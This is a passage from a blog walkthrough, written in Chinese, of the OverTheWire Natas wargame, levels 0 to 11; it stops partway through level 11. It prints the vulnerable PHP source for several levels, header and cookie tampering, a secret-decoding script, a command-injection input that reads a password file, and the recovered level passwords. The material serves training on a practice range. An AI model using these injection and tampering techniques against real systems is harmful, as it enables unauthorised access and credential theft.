href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnhub</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a5814cc3/">Vulnhub-64base</a></li><li class="sidebar-cat-post"><a href="/posts/b7e54991/">Vulnhub-Mercy</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/c70009a1/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">OverTheWire-Natas</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-08-21 14:15:33" itemprop="dateCreated datePublished" datetime="2025-08-21T14:15:33+08:00">2025-08-21</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">23m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/OverTheWire/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">OverTheWire</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/linux/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">linux</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><pre class="language-none"><code class="language-none">Username: natas0
Password: natas0</code></pre>

<p>查看源码</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814084643966.png" alt="image-20250814084643966" loading="lazy"></p>
<pre class="language-none"><code class="language-none">The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq</code></pre>

<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814084732269.png" alt="image-20250814084732269" loading="lazy"></p>
<p>限制右键可以f12，也可以直接访问</p>
<pre class="language-none"><code class="language-none">view-source:http:&#x2F;&#x2F;natas1.natas.labs.overthewire.org&#x2F;</code></pre>

<pre class="language-none"><code class="language-none">The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI</code></pre>

<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814084928396.png" alt="image-20250814084928396" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085243164.png" alt="image-20250814085243164" loading="lazy"></p>
<p>发现存在file目录</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085324406.png" alt="image-20250814085324406" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085332828.png" alt="image-20250814085332828" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># username:password</span>
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH</code></pre>

<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085431576.png" alt="image-20250814085431576" loading="lazy"></p>
<p><img src="C:\Users\xt\AppData\Roaming\Typora\typora-user-images\image-20250814085447846.png" alt="image-20250814085447846" loading="lazy"></p>
<pre class="language-none"><code class="language-none">No more information leaks!! Not even Google will find it this time...</code></pre>

<p>说明写了robots.txt</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085518251.png" alt="image-20250814085518251" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085530063.png" alt="image-20250814085530063" loading="lazy"></p>
<pre class="language-none"><code class="language-none">natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ</code></pre>

<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085608630.png" alt="image-20250814085608630" loading="lazy"></p>
<p>修改referer即可</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085706128.png" alt="image-20250814085706128" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK</code></pre>

<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085738804.png" alt="image-20250814085738804" loading="lazy"></p>
<p>可以看到请求包有个loggedin cookie，修改成1</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085850037.png" alt="image-20250814085850037" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085909429.png" alt="image-20250814085909429" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</code></pre>

<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814085956845.png" alt="image-20250814085956845" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"includes/secret.inc"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"submit"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Access granted. The password for natas7 is &lt;censored>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Wrong secret"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>includes/secret.inc</code>可以直接访问</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814090541112.png" alt="image-20250814090541112" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS </code></pre>

<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814090629394.png" alt="image-20250814090629394" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814090720110.png" alt="image-20250814090720110" loading="lazy"></p>
<p>url参数可以打SSRF</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814090815188.png" alt="image-20250814090815188" loading="lazy"></p>
<pre class="language-none"><code class="language-none">xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q </code></pre>



<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814090944933.png" alt="image-20250814090944933" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>

<span class="token variable">$encodedSecret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"3d3d516343746d4d6d6c315669563362"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">encodeSecret</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"submit"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">encodeSecret</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$encodedSecret</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Access granted. The password for natas9 is &lt;censored>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Wrong secret"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>还原secret即可</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$encodedSecret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"3d3d516343746d4d6d6c315669563362"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$encodedSecret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#oubWYf2kBq</span></span></code></pre>

<pre class="language-none"><code class="language-none">Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t </code></pre>

<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814091303644.png" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"needle"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"needle"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"grep -i <span class="token interpolation"><span class="token variable">$key</span></span> dictionary.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>直接注入命令即可</p>
<pre class="language-none"><code class="language-none">123;cat &#x2F;etc&#x2F;natas_webpass&#x2F;natas10;</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814091804706.png" alt="image-20250814091804706" loading="lazy"></p>
<pre class="language-none"><code class="language-none">t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu</code></pre>

<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814091844332.png" alt="image-20250814091844332" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"needle"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"needle"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[;|&amp;]/'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Input contains an illegal character!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"grep -i <span class="token interpolation"><span class="token variable">$key</span></span> dictionary.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>限制了命令注入,直接任意匹配即可</p>
<pre class="language-none"><code class="language-none">&quot;&quot; &#x2F;etc&#x2F;natas_webpass&#x2F;natas10</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814092243928.png" alt="image-20250814092243928" loading="lazy"></p>
<pre class="language-none"><code class="language-none">natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk</code></pre>

<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>

<span class="token variable">$defaultdata</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"showpassword"</span><span class="token operator">=></span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bgcolor"</span><span class="token operator">=></span><span class="token string double-quoted-string">"#ffffff"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">xor_encrypt</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;censored>'</span><span class="token punctuation">;</span>
    <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$in</span><span class="token punctuation">;</span>
    <span class="token variable">$outText</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

    <span class="token comment">// Iterate through each character</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$outText</span> <span class="token operator">.=</span> <span class="token variable">$text</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">%</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$outText</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">loadData</span><span class="token punctuation">(</span><span class="token variable">$def</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">;</span>
    <span class="token variable">$mydata</span> <span class="token operator">=</span> <span class="token variable">$def</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$tempdata</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">xor_encrypt</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$tempdata</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"showpassword"</span><span class="token punctuation">,</span> <span class="token variable">$tempdata</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bgcolor"</span><span class="token punctuation">,</span> <span class="token variable">$tempdata</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$tempdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$mydata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'showpassword'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tempdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'showpassword'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$mydata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tempdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$mydata</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">saveData</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">xor_encrypt</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">loadData</span><span class="token punctuation">(</span><span class="token variable">$defaultdata</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bgcolor"</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">saveData</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>natas11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">background</span><span class="token punctuation">:</span> <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bgcolor'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
Cookies are protected with XOR encryption<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"showpassword"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"yes"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"The password for natas12 is &lt;censored>&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>默认data就是</p>
<pre class="language-none"><code class="language-none">array( &quot;showpassword&quot;&#x3D;&gt;&quot;no&quot;, &quot;bgcolor&quot;&#x3D;&gt;&quot;#ffffff&quot;)</code></pre>

<p>首先拿到密钥</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$plaintext</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#123;"showpassword":"no","bgcolor":"#ffffff"&#125;'</span><span class="token punctuation">;</span>
<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D"</span><span class="token punctuation">;</span>
